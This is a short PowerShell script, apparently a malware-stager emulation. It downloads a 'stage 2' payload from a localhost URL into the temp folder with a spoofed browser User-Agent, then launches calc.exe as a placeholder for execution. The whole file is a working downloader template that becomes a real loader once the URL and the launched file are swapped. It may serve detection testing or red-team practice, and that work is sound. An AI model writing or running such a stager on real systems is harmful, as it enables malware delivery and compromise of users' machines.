[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://localhost:8000/assets/update.dat',
    [string]$WorkingPath = "$env:TEMP\stage2.bin",
    [int]$StageTimeout = 147,
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Invoke-PayloadFetch -SourceUrl $RemoteUrl -DestinationPath $WorkingPath -TimeoutSec $StageTimeout -UserAgent $BrowserAgent
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}

Write-Output "stage 21 initialized"
Start-Sleep -Seconds 40
